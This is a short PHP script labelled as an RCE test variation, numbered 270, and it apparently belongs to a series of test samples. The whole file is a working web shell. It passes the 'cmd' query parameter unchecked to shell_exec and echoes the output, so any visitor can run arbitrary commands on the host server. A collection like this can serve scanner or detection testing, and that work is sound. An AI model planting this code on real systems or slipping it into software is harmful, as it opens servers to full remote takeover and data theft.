<?php
// RCE test variation #270
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>